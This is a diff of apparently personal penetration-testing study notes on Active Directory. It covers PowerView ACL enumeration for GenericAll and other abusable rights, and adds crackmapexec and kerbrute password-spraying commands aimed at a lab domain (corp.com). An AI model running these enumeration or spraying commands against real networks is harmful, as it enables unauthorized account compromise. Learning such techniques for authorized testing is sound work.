@@ -51,12 +51,16 @@ setspn -L xxx_service
 Get-ObjectAcl -Identity user_name
 
 we will find some objects
+
 Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
 
+
 covert multiply ones
+
 "xxx","xxx","xx","xxxx" | Convert-SidToName
 
 //who has Gerneral All privi to this group
+
 Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
 
   GenericAll: Full permissions on object
@@ -66,4 +70,11 @@ Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -e
   AllExtendedRights: Change password, reset password, etc.
   ForceChangePassword: Password change for object
   Self (Self-Membership): Add ourselves to for example a group
+```
+
+##### PasswdAttack
+```
+crackmapexec smb 192.168.50.75 -u dave -p 'Flowers1' -d corp.com
+
+.\kerbrute_windows_amd64.exe passwordspray -d corp.com .\usernames.txt "Nexus123!"
 ```
